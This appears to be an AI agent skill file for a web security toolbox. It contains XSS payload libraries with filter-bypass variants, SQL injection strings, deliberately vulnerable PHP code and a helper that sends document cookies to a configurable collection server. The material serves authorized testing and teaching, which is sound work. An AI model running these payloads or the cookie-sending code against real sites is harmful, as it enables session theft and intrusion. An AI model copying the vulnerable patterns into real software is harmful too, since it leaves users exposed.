---
name: acidrain-xss-security-testing
description: AcidRain web security toolbox for XSS analysis, JavaScript utilities, and PHP injection testing in authorized environments
triggers:
  - use acidrain for xss testing
  - run acidrain security scripts
  - test xss with acidrain
  - analyze cross-site scripting vulnerabilities
  - setup acidrain for web security research
  - inject test payloads with acidrain
  - run acidrain javascript utilities
  - configure acidrain php scripts
---

# AcidRain XSS Security Testing Skill

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

AcidRain is a web-oriented collection of XSS analysis resources, JavaScript utilities, PHP examples, and injection testing samples for authorized security testing and hands-on learning. It provides browser-side and server-side material organized for web security research, penetration testing education, and controlled vulnerability analysis.

**Key capabilities:**
- XSS payload generation and testing
- JavaScript-based client-side security utilities
- PHP server-side injection examples
- Input validation and output encoding analysis
- Web security research snippets

**License:** GPL-3.0  
**Primary Languages:** HTML, JavaScript, PHP

## Installation

Clone the repository and navigate to the project directory:

```bash
git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
cd acidrain-security-script-hub
```

Explore the directory structure:

```bash
ls -la scripts/
# Expected directories:
# scripts/javascript/
# scripts/php/
# scripts/xss/
```

## Project Structure

```
acidrain-security-script-hub/
├── scripts/
│   ├── javascript/      # Client-side utilities
│   ├── php/            # Server-side examples
│   └── xss/            # XSS testing payloads
├── configs/            # Configuration files
├── examples/           # Usage examples
├── docs/              # Documentation
└── README.md
```

## JavaScript Utilities

### Basic XSS Payload Injection

Example JavaScript for testing XSS vulnerabilities in authorized environments:

```javascript
// scripts/javascript/xss-basic.js
// Basic XSS test payload injector

function testBasicXSS(targetElement) {
  const payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>'
  ];
  
  payloads.forEach((payload, index) => {
    console.log(`Testing payload ${index + 1}: ${payload}`);
    // Inject into target element
    if (targetElement) {
      targetElement.innerHTML = payload;
    }
  });
}

// Usage in browser console or testing environment
// testBasicXSS(document.getElementById('vulnerable-input'));
```

### DOM-Based XSS Analysis

```javascript
// scripts/javascript/dom-xss-analyzer.js
// Analyze DOM for potential XSS sinks

function analyzeDOMSinks() {
  const sinks = {
    innerHTML: document.querySelectorAll('[innerHTML]'),
    outerHTML: document.querySelectorAll('[outerHTML]'),
    document_write: 'document.write usage',
    eval_calls: 'eval() usage'
  };
  
  console.log('=== DOM XSS Sink Analysis ===');
  
  // Check for dangerous innerHTML usage
  document.querySelectorAll('*').forEach(el => {
    if (el.innerHTML && el.innerHTML.includes('<script>')) {
      console.warn('Potential XSS sink found:', el);
    }
  });
  
  // Monitor URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  urlParams.forEach((value, key) => {
    console.log(`URL param ${key}: ${value}`);
    if (/<[^>]*script/i.test(value)) {
      console.error(`Dangerous script tag in parameter ${key}`);
    }
  });
  
  return sinks;
}

// Export for use in testing
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { analyzeDOMSinks };
}
```

### Cookie Extraction Utility

```javascript
// scripts/javascript/cookie-extractor.js
// Extract and analyze cookies (for authorized testing only)

function extractCookies() {
  const cookies = document.cookie.split(';').reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split('=');
    acc[key] = value;
    return acc;
  }, {});
  
  console.log('Extracted cookies:', cookies);
  
  // Analyze cookie security flags
  const analysis = {
    hasHttpOnly: document.cookie.includes('HttpOnly'),
    hasSecure: document.cookie.includes('Secure'),
    hasSameSite: document.cookie.includes('SameSite'),
    cookieCount: Object.keys(cookies).length
  };
  
  console.log('Cookie security analysis:', analysis);
  
  return { cookies, analysis };
}

// Send to test server (use environment variable)
function exfiltrateToTestServer(data) {
  const testServerUrl = process.env.ACIDRAIN_TEST_SERVER || 'http://localhost:8080/collect';
  
  fetch(testServerUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).then(response => {
    console.log('Data sent to test server:', response.status);
  }).catch(err => {
    console.error('Failed to send to test server:', err);
  });
}
```

## PHP Server-Side Examples

### Input Validation Testing

```php
<?php
// scripts/php/input-validator.php
// Test input validation and sanitization

class InputValidator {
    
    // Vulnerable version (for testing)
    public static function vulnerableEcho($input) {
        echo $input; // Direct output - XSS vulnerable
    }
    
    // Sanitized version (secure example)
    public static function sanitizedEcho($input) {
        echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }
    
    // Test various payloads
    public static function testPayloads($payloads) {
        $results = [];
        
        foreach ($payloads as $payload) {
            $results[] = [
                'original' => $payload,
                'vulnerable' => $payload, // Would execute
                'sanitized' => htmlspecialchars($payload, ENT_QUOTES, 'UTF-8'),
                'filtered' => filter_var($payload, FILTER_SANITIZE_STRING)
            ];
        }
        
        return $results;
    }
}

// Usage example
$testPayloads = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "'; DROP TABLE users; --",
    '<svg/onload=alert(1)>'
];

$results = InputValidator::testPayloads($testPayloads);
header('Content-Type: application/json');
echo json_encode($results, JSON_PRETTY_PRINT);
?>
```

### SQL Injection Testing Helper

```php
<?php
// scripts/php/sql-injection-tester.php
// Test SQL injection scenarios in controlled environment

class SQLInjectionTester {
    
    private $testDb;
    
    public function __construct($dbHost, $dbName, $dbUser, $dbPass) {
        // Use environment variables for credentials
        $host = getenv('ACIDRAIN_DB_HOST') ?: $dbHost;
        $name = getenv('ACIDRAIN_DB_NAME') ?: $dbName;
        $user = getenv('ACIDRAIN_DB_USER') ?: $dbUser;
        $pass = getenv('ACIDRAIN_DB_PASS') ?: $dbPass;
        
        $this->testDb = new PDO(
            "mysql:host=$host;dbname=$name",
            $user,
            $pass,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );
    }
    
    // Vulnerable query (for demonstration)
    public function vulnerableQuery($userInput) {
        $query = "SELECT * FROM users WHERE username = '$userInput'";
        error_log("Vulnerable query: $query");
        
        try {
            $result = $this->testDb->query($query);
            return $result->fetchAll(PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            return ['error' => $e->getMessage()];
        }
    }
    
    // Secure query (prepared statement)
    public function secureQuery($userInput) {
        $stmt = $this->testDb->prepare(
            "SELECT * FROM users WHERE username = :username"
        );
        $stmt->bindParam(':username', $userInput, PDO::PARAM_STR);
        $stmt->execute();
        
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    // Test common injection payloads
    public function testPayloads() {
        $payloads = [
            "admin' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "admin'; DROP TABLE users--"
        ];
        
        $results = [];
        foreach ($payloads as $payload) {
            $results[$payload] = [
                'vulnerable' => $this->vulnerableQuery($payload),
                'secure' => $this->secureQuery($payload)
            ];
        }
        
        return $results;
    }
}

// Initialize with environment variables
$tester = new SQLInjectionTester(
    'localhost',
    'test_db',
    'test_user',
    'test_pass'
);

// Run tests in authorized environment only
if (getenv('ACIDRAIN_AUTHORIZED') === 'true') {
    $results = $tester->testPayloads();
    echo json_encode($results, JSON_PRETTY_PRINT);
} else {
    echo "Unauthorized: Set ACIDRAIN_AUTHORIZED=true to run tests\n";
}
?>
```

## XSS Payload Reference

### Common XSS Vectors

```javascript
// scripts/xss/payload-library.js
const XSSPayloads = {
  
  basic: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>'
  ],
  
  encoded: [
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '\x3cscript\x3ealert(1)\x3c/script\x3e'
  ],
  
  eventHandlers: [
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>'
  ],
  
  domBased: [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)'
  ],
  
  filterBypass: [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src="x" onerror="alert(1)">',
    '<svg><script>alert(1)</script></svg>',
    '<<SCRIPT>alert(1)//<<SCRIPT>'
  ]
};

function testPayload(payload, targetUrl) {
  console.log(`Testing payload: ${payload}`);
  console.log(`Target: ${targetUrl}`);
  
  // Construct test URL
  const testUrl = `${targetUrl}?q=${encodeURIComponent(payload)}`;
  console.log(`Full URL: ${testUrl}`);
  
  return testUrl;
}

module.exports = XSSPayloads;
```

## Configuration

Create a configuration file for your testing environment:

```javascript
// configs/acidrain.config.js
module.exports = {
  // Test environment settings
  testServer: {
    host: process.env.ACIDRAIN_HOST || 'localhost',
    port: process.env.ACIDRAIN_PORT || 8080,
    protocol: process.env.ACIDRAIN_PROTOCOL || 'http'
  },
  
  // Database settings (for PHP scripts)
  database: {
    host: process.env.ACIDRAIN_DB_HOST || 'localhost',
    name: process.env.ACIDRAIN_DB_NAME || 'test_db',
    user: process.env.ACIDRAIN_DB_USER || 'test_user',
    password: process.env.ACIDRAIN_DB_PASS || ''
  },
  
  // Payload settings
  payloads: {
    maxLength: 1000,
    encoding: 'utf-8',
    timeout: 5000
  },
  
  // Authorization check
  authorized: process.env.ACIDRAIN_AUTHORIZED === 'true',
  
  // Logging
  logging: {
    level: process.env.ACIDRAIN_LOG_LEVEL || 'info',
    file: process.env.ACIDRAIN_LOG_FILE || './acidrain.log'
  }
};
```

### Environment Variables

```bash
# .env.example
ACIDRAIN_HOST=localhost
ACIDRAIN_PORT=8080
ACIDRAIN_PROTOCOL=http
ACIDRAIN_TEST_SERVER=http://localhost:8080/collect
ACIDRAIN_DB_HOST=localhost
ACIDRAIN_DB_NAME=test_db
ACIDRAIN_DB_USER=test_user
ACIDRAIN_DB_PASS=your_password_here
ACIDRAIN_AUTHORIZED=true
ACIDRAIN_LOG_LEVEL=debug
ACIDRAIN_LOG_FILE=./logs/acidrain.log
```

## Common Patterns

### Setting Up a Test Target

```bash
# Create isolated test environment
mkdir -p acidrain-lab
cd acidrain-lab

# Copy scripts
cp -r ../acidrain-security-script-hub/scripts .

# Start PHP development server
php -S localhost:8080 -t ./scripts/php/
```

### Running JavaScript Tests in Browser

```html
<!-- example-test-page.html -->
<!DOCTYPE html>
<html>
<head>
    <title>AcidRain XSS Test Page</title>
</head>
<body>
    <h1>XSS Testing Environment</h1>
    
    <div id="vulnerable-output"></div>
    
    <script src="scripts/javascript/xss-basic.js"></script>
    <script src="scripts/javascript/dom-xss-analyzer.js"></script>
    
    <script>
        // Run analysis
        window.onload = function() {
            if (confirm('Run XSS analysis? (Authorized testing only)')) {
                analyzeDOMSinks();
            }
        };
    </script>
</body>
</html>
```

### Automated Testing Workflow

```javascript
// test-runner.js
const XSSPayloads = require('./scripts/xss/payload-library.js');
const config = require('./configs/acidrain.config.js');

async function runTestSuite() {
  if (!config.authorized) {
    console.error('Testing not authorized. Set ACIDRAIN_AUTHORIZED=true');
    return;
  }
  
  console.log('Starting AcidRain test suite...');
  
  const results = {
    passed: 0,
    failed: 0,
    tests: []
  };
  
  // Test each payload category
  for (const [category, payloads] of Object.entries(XSSPayloads)) {
    console.log(`\nTesting ${category} payloads...`);
    
    for (const payload of payloads) {
      const testUrl = `${config.testServer.protocol}://${config.testServer.host}:${config.testServer.port}/test?q=${encodeURIComponent(payload)}`;
      
      try {
        const response = await fetch(testUrl);
        const text = await response.text();
        
        const detected = text.includes(payload);
        results.tests.push({
          category,
          payload,
          detected,
          status: detected ? 'VULNERABLE' : 'SAFE'
        });
        
        if (detected) results.failed++;
        else results.passed++;
        
      } catch (error) {
        console.error(`Error testing payload: ${error.message}`);
      }
    }
  }
  
  console.log('\n=== Test Results ===');
  console.log(`Passed: ${results.passed}`);
  console.log(`Failed: ${results.failed}`);
  console.log(`Total: ${results.tests.length}`);
  
  return results;
}

if (require.main === module) {
  runTestSuite().then(results => {
    process.exit(results.failed > 0 ? 1 : 0);
  });
}

module.exports = { runTestSuite };
```

## Troubleshooting

### Issue: Scripts Not Executing

**Solution:** Check authorization environment variable:

```bash
export ACIDRAIN_AUTHORIZED=true
```

### Issue: PHP Connection Errors

**Solution:** Verify database credentials and connectivity:

```bash
# Test MySQL connection
mysql -h $ACIDRAIN_DB_HOST -u $ACIDRAIN_DB_USER -p$ACIDRAIN_DB_PASS $ACIDRAIN_DB_NAME

# Check PHP extensions
php -m | grep -i pdo
```

### Issue: CORS Errors in Browser

**Solution:** Configure test server with proper headers:

```php
<?php
// Add to PHP scripts
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');
?>
```

### Issue: Payloads Not Triggering

**Solution:** Check encoding and context:

```javascript
// Test different encoding methods
const payload = '<script>alert(1)</script>';
console.log('Original:', payload);
console.log('URL encoded:', encodeURIComponent(payload));
console.log('HTML entities:', payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
console.log('Double encoded:', encodeURIComponent(encodeURIComponent(payload)));
```

## Best Practices

1. **Always obtain authorization** before testing any system
2. **Use isolated environments** (VMs, containers, local servers)
3. **Document all tests** with timestamps and results
4. **Never test production systems** without explicit permission
5. **Store credentials** in environment variables, never in code
6. **Log all activities** for audit trails
7. **Clean up test data** after completion

## Safety Reminders

⚠️ **IMPORTANT**: AcidRain is for authorized security testing only. Unauthorized use against systems you don't own or have permission to test is illegal and unethical.

- Only test systems you own or have written authorization to test
- Use isolated lab environments whenever possible
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations
- Respect scope limitations in security engagements
